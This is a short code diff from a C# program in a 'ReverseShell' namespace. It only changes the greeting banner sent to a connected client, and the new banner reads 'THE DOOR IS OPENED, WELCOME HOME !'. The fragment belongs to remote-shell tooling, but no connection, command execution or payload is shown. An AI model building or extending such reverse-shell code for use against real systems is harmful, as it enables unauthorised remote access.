@@ -28,7 +28,7 @@ namespace ReverseShell
                 Console.WriteLine("[+] Opening stream");
                 using (var stream = client.GetStream())
                 {
-                    string banner = "WELCOME TO TEHTRIS HELL !\r\n";
+                    string banner = "THE DOOR IS OPENED, WELCOME HOME !\r\n";
                     stream.Write(Encoding.ASCII.GetBytes(banner), 0, banner.Length);
 
                     Console.WriteLine("[+] Opening reading stream");
